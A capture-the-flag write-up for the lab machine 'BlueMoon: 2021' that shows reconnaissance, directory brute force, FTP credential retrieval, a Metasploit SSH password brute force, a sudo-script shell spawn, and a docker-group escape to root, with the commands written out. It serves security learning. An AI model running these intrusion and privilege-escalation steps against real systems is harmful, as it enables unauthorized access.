# 🛡️ BlueMoon: 2021 Write-up

Name: BlueMoon: 2021\
Date release: 7 Apr 2021\
Author: Kirthik\
Series: BlueMoon

---

# 📌 Target Information

 | Field                | Value
 | ---------------------| -----------------------------------------
 | **Target IP**        | `192.168.56.101`
 | **Network Range**    | `192.168.56.0/24`
 | **Assessment Type**  | Internal Network Penetration Test
 | **Objective**        | Gain root access and retrieve all flags

---

# 🔎 1. Reconnaissance

The reconnaissance phase focuses on identifying live hosts within the
network.

``` bash
nmap -sn 192.168.56.101
```

Result:

<img width="526" height="123" alt="image" src="https://github.com/user-attachments/assets/f2c61e8b-1a88-4e26-a527-101de23f2bd4" />


---

# 📡 2. Scanning

A full TCP port scan with service detection was performed.

``` bash
nmap -p- -sV 192.168.56.101
```

<img width="623" height="330" alt="image" src="https://github.com/user-attachments/assets/d88f2b00-7d21-4cf4-a6e0-585e642680e1" />

---

# 🚪 3. Gaining Access

## Web Enumeration

``` bash
http://192.168.56.101
```
<img width="670" height="651" alt="image" src="https://github.com/user-attachments/assets/4ea5e121-47de-4996-ab00-3da2da13c795" />


### Directory Brute Force

``` bash
gobuster dir -u http://192.168.56.101 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Result:

<img width="630" height="393" alt="image" src="https://github.com/user-attachments/assets/79e23ff5-4571-4d1e-a677-544b3742ed97" />

<img width="1362" height="601" alt="image" src="https://github.com/user-attachments/assets/3276b530-4e22-430a-a5a9-d4b85987a3e5" />

<img width="1362" height="606" alt="image" src="https://github.com/user-attachments/assets/89d08320-792b-4de5-8ff5-189bb4483a44" />

```

Hidden resources were discovered, including a page containing a **QR code**.


```
## QR Code Analysis

<img width="1360" height="628" alt="image" src="https://github.com/user-attachments/assets/d33504d8-1ccf-4800-8bae-579d6f3ba86e" />


<img width="726" height="944" alt="image" src="https://github.com/user-attachments/assets/c80d68ff-02fa-492c-b799-98842d74313f" />


Scanning the QR code revealed **FTP credentials**.

---

## FTP Access

``` bash
ftp 192.168.56.101
```

List files:

``` bash
ls
```

Files discovered:

``` bash
information.txt
p_lists.txt
```

Download files:

``` bash
get information.txt
get p_lists.txt
```

Exit FTP:

``` bash
exit
```

---

## File Analysis

``` bash
cat information.txt
cat p_lists.txt
```

Result (information.txt):
``` bash
cat information.txt

Hello robin ...!
    
    I'm Already Told You About Your Password Weekness. I will give a Password list. you May Choose Anyone of The Password.
```

Result (p_lists.txt):
``` bash
cat p_lists.txt 
h4ck3rp455wd
4dm1n
Pr0h4ck3r
5cr1ptk1dd3
pubgpr0pl4yer
H34d5h00t3r
p@ssw0rd
@@d1dn0tf1nd
J4ck_5p4rr0w
c4pt10n_jack
D0veC4m3r0n
f1nnb4l0r
r0manr3ing5
s3thr0lin5
Demonk1ng
R4ndy0rton
Big_sh0w
j0hnc3na
5tr0ngp@ssw0rd
S4br1n4
4nnlyn
C4rp3nt3r
K0fiKing5t0n
chNAMPIN
Herr0lins
G0palT0p3r
Log3shDriv3r
k4rv3ndh4nh4ck3r
P0nmuGunth0n
Shank3rD3v
KishorMilkV4n
S4th15hR4cer
```

Findings:

``` bash
-   `information.txt` -- message for user **robin**
-   `p_lists.txt` -- password list
```

---

## SSH Brute Force

Start Metasploit:

``` bash
msfconsole
```

Search module:

``` bash
search ssh_login
```

Configure exploit:

``` bash
set RHOSTS 192.168.56.101
set PASS_FILE p_lists.txt
set USERNAME robin
run
```

Credentials discovered:

    Username: robin
    Password: k4rv3ndh4nh4ck3r

---

## SSH Login

``` bash
ssh robin@192.168.56.101
```

Retrieve user flag:

``` bash
ls
cat user1.txt
```

Flag:

    Fl4g{u5er1r34ch3d5ucc355fully}

---

# ⬆️ 4. Privilege Escalation

Explore system:

``` bash
cd
ls
```

Inspect script:

``` bash
cat feedback.sh
```

Check sudo privileges:

``` bash
sudo -l
```

Execute script as user **jerry**:

``` bash
sudo -u jerry ./feedback.sh
```

Input:

    jerry
    /bin/bash

Verify user:

``` bash
whoami
```

Output:

    jerry

Retrieve second flag:

``` bash
cd /home/jerry
ls
cat user2.txt
```

---

## Docker Privilege Escalation

Check groups:

``` bash
id
```

Exploit docker:

``` bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

Verify root:

``` bash
whoami
```

Output:

    root

Retrieve root flag:

``` bash
cd /root
ls
cat root.txt
```

# 🛠️ Tools Used

 | Tool        | Purpose
 | ------------| -----------------------
 | Nmap        | Network scanning
 | Gobuster    | Directory enumeration
 | Metasploit  | SSH brute force
 | FTP         | File retrieval
 | Docker      | Privilege escalation

------------------------------------------------------------------------


